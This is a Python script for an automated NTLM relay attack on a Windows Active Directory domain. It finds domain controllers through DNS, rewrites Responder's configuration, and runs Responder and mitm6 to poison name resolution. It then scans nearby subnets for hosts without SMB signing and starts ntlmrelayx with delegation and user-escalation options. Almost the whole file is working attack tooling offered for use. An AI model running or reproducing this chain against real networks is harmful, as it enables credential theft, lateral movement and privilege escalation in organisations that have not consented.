#!/usr/bin/env python3

import argparse
import sys
import os
import re
import asyncio
import dns.resolver
import ipaddress
import netifaces
import signal
import tempfile
import subprocess
from termcolor import colored
from subprocess import Popen, PIPE, run
from datetime import datetime
from netaddr import IPNetwork, AddrFormatError
from pathlib import Path

class AutoRelay:
    def __init__(self, domain, interface=None, verbose=False):
        self.domain = domain
        self.interface = interface or self.get_default_interface()
        self.local_ip = self.get_local_ip()
        self.dcs = set()
        self.relay_targets = set()
        self.processes = []
        self.temp_dir = tempfile.mkdtemp()
        self.log_dir = Path('logs')
        self.log_dir.mkdir(exist_ok=True)
        self.verbose = verbose

    def get_default_interface(self):
        try:
            return netifaces.gateways()['default'][netifaces.AF_INET][1]
        except:
            for iface in netifaces.interfaces():
                if not iface.startswith('lo'):
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_INET in addrs:
                        return iface
            return None

    def get_local_ip(self):
        return netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]['addr']

    def kill_processes(self, process_names):
        """Kill processes by name"""
        try:
            for name in process_names:
                if self.verbose:
                    print_info(f"Killing process: {name}")
                subprocess.run(['pkill', '-f', name], stderr=subprocess.DEVNULL)
        except Exception as e:
            print_bad(f"Error killing processes: {e}")

    async def read_process_output(self, proc, name):
        """Continuously read and display process output"""
        while True:
            line = await proc.stdout.readline()
            if not line:
                break
            line = line.decode().strip()
            if line:
                print_info(f"[{name}] {line}")

    async def setup_services(self):
        """Setup and start required services"""
        try:
            # Kill any existing instances
            self.kill_processes(['responder', 'mitm6', 'ntlmrelayx.py'])
            await asyncio.sleep(1)

            # Configure Responder
            responder_conf = Path('/usr/share/responder/Responder.conf')
            if responder_conf.exists():
                if self.verbose:
                    print_info("Reading Responder configuration")
                config_data = responder_conf.read_text()
                config_data = re.sub(r'SMB = On', 'SMB = Off', config_data)
                config_data = re.sub(r'HTTP = On', 'HTTP = Off', config_data)
                responder_conf.write_text(config_data)
                print_good("Configured Responder.conf")

            # Start Responder
            resp_cmd = f"responder -I {self.interface} -w -d"
            print_info(f"Starting Responder: {resp_cmd}")
            resp_proc = await asyncio.create_subprocess_exec(
                *resp_cmd.split(),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            if resp_proc.returncode is None:
                self.processes.append(resp_proc)
                print_good("Responder started successfully")
                if self.verbose:
                    asyncio.create_task(self.read_process_output(resp_proc, "Responder"))
            else:
                _, stderr = await resp_proc.communicate()
                print_bad(f"Failed to start Responder: {stderr.decode()}")

            await asyncio.sleep(2)

            # Start mitm6
            mitm6_cmd = f"mitm6 -d {self.domain} -i {self.interface}"
            print_info(f"Starting mitm6: {mitm6_cmd}")
            mitm6_proc = await asyncio.create_subprocess_exec(
                *mitm6_cmd.split(),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            if mitm6_proc.returncode is None:
                self.processes.append(mitm6_proc)
                print_good("mitm6 started successfully")
                if self.verbose:
                    asyncio.create_task(self.read_process_output(mitm6_proc, "mitm6"))
            else:
                _, stderr = await mitm6_proc.communicate()
                print_bad(f"Failed to start mitm6: {stderr.decode()}")

            return True

        except Exception as e:
            print_bad(f"Error setting up services: {e}")
            return False

    async def run_cmd(self, cmd):
        """Run command and capture output"""
        if self.verbose:
            print_info(f"Running command: {cmd}")
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await proc.communicate()
        if self.verbose and stderr:
            print_bad(f"Command stderr: {stderr.decode()}")
        return stdout.decode(), stderr.decode(), proc.returncode

    async def scan_host(self, ip):
        """Scan single host for SMB signing"""
        try:
            if self.verbose:
                print_info(f"Scanning host: {ip}")

            # Try nmap
            cmd = f"nmap -n -sS -p445 --script smb-security-mode {ip} -Pn"
            stdout, stderr, code = await self.run_cmd(cmd)
            
            if code == 0:
                if "message_signing: disabled" in stdout:
                    print_good(f"Found relay target via nmap: {ip}")
                    return ip
                elif self.verbose:
                    print_info(f"SMB signing enabled or unreachable: {ip}")

            # Try smbclient if port is open
            if "445/tcp open" in stdout:
                cmd = f"smbclient -L //{ip} -N -g"
                stdout, stderr, code = await self.run_cmd(cmd)
                
                if code == 0:
                    print_good(f"Found accessible SMB target: {ip}")
                    return ip
                elif self.verbose:
                    print_info(f"SMB access denied or error: {ip}")

        except Exception as e:
            print_bad(f"Error scanning {ip}: {e}")
        return None

    async def discover_dcs(self):
        """Find domain controllers using DNS"""
        try:
            if self.verbose:
                print_info(f"Starting DC discovery for domain: {self.domain}")
            
            resolver = dns.resolver.Resolver()
            resolver.lifetime = 3
            seen_dcs = set()
            
            queries = [
                f'_ldap._tcp.dc._msdcs.{self.domain}',
                f'_kerberos._tcp.dc._msdcs.{self.domain}',
                f'_gc._tcp.{self.domain}'
            ]
            
            for query in queries:
                if self.verbose:
                    print_info(f"Querying DNS: {query}")
                try:
                    answers = resolver.resolve(query, 'SRV')
                    for answer in answers:
                        dc_hostname = str(answer.target).rstrip('.')
                        if self.verbose:
                            print_info(f"Found DC hostname: {dc_hostname}")
                        try:
                            dc_ips = resolver.resolve(dc_hostname, 'A')
                            for ip in dc_ips:
                                ip_str = str(ip)
                                if ip_str not in seen_dcs:
                                    seen_dcs.add(ip_str)
                                    self.dcs.add(ip_str)
                                    print_good(f'Found DC: {dc_hostname} ({ip})')
                        except Exception as e:
                            if self.verbose:
                                print_bad(f"Error resolving DC IP: {e}")
                except Exception as e:
                    if self.verbose:
                        print_bad(f"Error querying DNS: {e}")

            if self.dcs:
                print_good(f"Found {len(self.dcs)} Domain Controllers")
            else:
                print_bad("No Domain Controllers found via DNS")

        except Exception as e:
            print_bad(f"Error during DC discovery: {e}")

    async def scan_subnet(self, subnet):
        """Scan subnet for relay targets"""
        print_info(f'Scanning subnet {subnet}')
        tasks = []
        
        for ip in IPNetwork(subnet):
            ip_str = str(ip)
            if ip_str.endswith('.0') or ip_str.endswith('.255'):
                continue
            tasks.append(self.scan_host(ip_str))

        if tasks:
            chunk_size = 25
            for i in range(0, len(tasks), chunk_size):
                if self.verbose:
                    print_info(f"Scanning chunk {i//chunk_size + 1} of {len(tasks)//chunk_size + 1}")
                chunk = tasks[i:i + chunk_size]
                results = await asyncio.gather(*chunk)
                for result in results:
                    if result:
                        self.relay_targets.add(result)
                await asyncio.sleep(0.5)

    async def start_ntlmrelayx(self, targets_file):
        """Start ntlmrelayx with monitoring"""
        cmd = (f"ntlmrelayx.py -tf {targets_file} --smb2support "
               f"--delegate-access --escalate-user")
        print_info(f"Starting ntlmrelayx: {cmd}")
        
        proc = await asyncio.create_subprocess_exec(
            *cmd.split(),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        self.processes.append(proc)
        if self.verbose:
            asyncio.create_task(self.read_process_output(proc, "ntlmrelayx"))
        
        return proc

    async def auto_relay(self):
        """Run the full auto relay chain"""
        try:
            if not await self.setup_services():
                return

            await self.discover_dcs()
            if not self.dcs:
                print_bad("No Domain Controllers found")
                return

            subnets = set()
            for dc in self.dcs:
                try:
                    ip = ipaddress.ip_address(dc)
                    network = ipaddress.ip_network(f'{ip.exploded}/24', strict=False)
                    subnets.add(str(network))
                    print_good(f'Added subnet: {network}')
                except Exception as e:
                    print_bad(f'Error processing subnet: {str(e)}')

            for subnet in subnets:
                await self.scan_subnet(subnet)

            if self.relay_targets:
                print_good(f"Found {len(self.relay_targets)} relay targets")
                
                targets_file = Path(f"{self.temp_dir}/targets.txt")
                targets_file.write_text('\n'.join(self.relay_targets))
                
                ntlmrelay_proc = await self.start_ntlmrelayx(targets_file)
                
                print_info("Attack chain running. Press Ctrl+C to stop...")
                while True:
                    await asyncio.sleep(1)
            else:
                print_bad("No relay targets found")

        except KeyboardInterrupt:
            print_info("\nReceived interrupt, cleaning up...")
        except Exception as e:
            print_bad(f"Error during attack chain: {e}")
        finally:
            self.cleanup()

    def cleanup(self):
        """Cleanup processes and files"""
        print_info("Cleaning up...")
        self.kill_processes(['responder', 'mitm6', 'ntlmrelayx.py'])
        
        try:
            for f in Path(self.temp_dir).glob('*'):
                f.unlink()
            Path(self.temp_dir).rmdir()
        except:
            pass

def parse_args():
    parser = argparse.ArgumentParser(description='Find and auto-attack SMB relay targets')
    parser.add_argument("-d", "--domain", required=True, help="Domain to attack (e.g. domain.local)")
    parser.add_argument("-i", "--interface", help="Network interface to use")
    parser.add_argument("--auto", action="store_true", help="Enable automatic attack chain")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    return parser.parse_args()

def print_bad(msg):
    print(colored('[-] ', 'red') + msg)

def print_info(msg):
    print(colored('[*] ', 'blue') + msg)

def print_good(msg):
    print(colored('[+] ', 'green') + msg)

async def main():
    args = parse_args()
    
    if os.geteuid():
        print_bad('Script must be run as root')
        sys.exit(1)

    if args.auto:
        relay = AutoRelay(args.domain, args.interface, args.verbose)
        await relay.auto_relay()
    else:
        print_bad("Please use --auto for automatic attack chain")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print_info("\nExiting...")
    except Exception as e:
        print_bad(f"Fatal error: {e}")
